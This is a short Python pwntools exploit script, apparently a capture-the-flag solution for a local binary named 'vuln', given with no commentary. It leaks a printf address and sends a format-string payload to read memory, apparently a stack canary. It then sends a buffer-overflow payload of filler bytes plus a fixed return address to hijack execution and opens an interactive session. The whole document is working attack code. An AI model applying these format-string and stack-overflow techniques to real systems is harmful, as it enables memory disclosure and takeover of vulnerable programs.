from pwn import*

context.update(arch='amd64',os='linux',log_level='debug')
context.terminal=['qterminal','-e']

p=process('./vuln')
gdb.attach(p,'b __stack_chk_fail')
p.recvuntil('0x')
printf_addr=int(p.recv(12),16)
log.info("addr= %#x" % (printf_addr+0x191928))
#payload=b'%s\x00\x00\x00\x00\x00\x00'
payload=b'%7$s%1$s'+p64(printf_addr+0x191928)
p.sendline(payload)
pause()
#newcanary=b'11111111'
p.sendline(b'1'*0x40)
sleep(0.2)
paylaod2=b'1'*0x38+p64(0x4012C3)
p.sendline(paylaod2)
p.interactive()